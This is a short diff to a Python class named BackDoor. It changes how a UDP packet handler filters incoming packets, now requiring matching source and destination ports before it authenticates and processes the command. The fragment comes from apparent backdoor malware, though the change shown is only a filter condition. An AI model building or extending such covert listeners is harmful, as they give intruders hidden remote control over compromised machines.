@@ -428,7 +428,7 @@ class BackDoor:
     def process_udp(self, packet: Packet):
         try:
             msg = packet[UDP].load.decode()
-            if UDP in packet and packet[UDP].dport == self.recv_port:
+            if UDP in packet and packet[UDP].sport == self.send_port and packet[UDP].dport == self.recv_port:
                 val = self.authenticate_packet(msg, packet)
                 if val:
                     self.process_packet(val)
